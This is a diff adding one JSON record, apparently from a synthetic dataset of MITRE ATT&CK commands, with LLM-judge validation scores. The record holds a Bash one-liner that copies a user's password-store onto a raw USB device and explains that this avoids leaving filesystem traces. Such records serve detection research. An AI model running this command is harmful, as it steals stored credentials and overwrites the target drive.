@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "tar -C \"$HOME\" -czf - .password-store | dd of=\"/dev/disk/by-id/usb-Generic_Flash_Disk_8GB-0:0\" bs=1M oflag=direct status=none",
+  "explanation": "Compresses the local password-store and writes it straight to the raw USB disk device, leaving no files on the mounted filesystem of the drive.",
+  "rationale_steps": [
+    "Compress sensitive password-store contents",
+    "Target the USB by unique by-id device node",
+    "Transfer the stream with dd directly to the block device to avoid filesystem traces"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-35fd8ad4",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid tar and dd flags, and a correct pipeline.",
+        "semantic_score": 3,
+        "semantic_justification": "It aligns with T1052 by streaming a compressed password store to a raw USB device, but would typically require root and an unmounted target and will overwrite the device, making 'Privilege: None' unrealistic for success.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T06:43:03.084602Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for both tar and dd commands, and correct piping syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by compressing password data and writing it directly to a physical USB device using raw device access, leaving minimal forensic traces on the filesystem.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:43:05.673339Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid flags and operators, and has balanced quotes, making it fully parseable and executable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by compressing a sensitive directory and writing it directly to a raw USB device, precisely matching the explanation and achieving exfiltration over a physical medium in an operationally plausible manner, even under 'none' privilege in common user scenarios.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:43:15.112567Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
